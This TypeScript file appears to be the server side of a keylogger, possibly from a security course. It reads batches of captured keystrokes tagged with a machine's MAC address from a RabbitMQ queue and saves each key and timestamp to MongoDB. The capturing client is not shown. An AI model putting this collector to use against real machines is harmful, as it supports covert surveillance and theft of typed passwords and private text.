import amqplib from 'amqplib'
import mongoose from 'mongoose'

const keystrokeSchema = new mongoose.Schema(
	{
		mac_addr: {
			type: String,
			required: true,
		},
		key: {
			type: String,
			required: true,
		},
		when: {
			type: Date,
			required: true,
		},
	},
	{
		autoCreate: true,
	},
)
const Keystroke = mongoose.model('Keystroke', keystrokeSchema)

await mongoose.connect(process.env.MONGO_URL!, { dbName: 'seg-comp' })

const conn = await amqplib.connect(process.env.RABBITMQ_URL!)
const ch = await conn.createChannel()

const queue = 'default'
await ch.assertQueue(queue)

await ch.consume(queue, async msg => {
	if (msg === null) {
		return
	}

	const { id, data } = JSON.parse(
		msg.content
			.toString()
			.replaceAll(`"`, `\\"`)
			.replaceAll(`\\"'\\"`, `"'"`)
			.replaceAll(/'(?!")/g, '"')
			.replaceAll(/\\(?!")/g, '\\\\'),
	)

	const promises: Promise<any>[] = []

	data.forEach(({ key, when }: Record<string, string>) => {
		promises.push(
			new Keystroke({
				key,
				mac_addr: id,
				when: new Date(when),
			}).save(),
		)
	})

	await Promise.all(promises)

	ch.ack(msg)
})
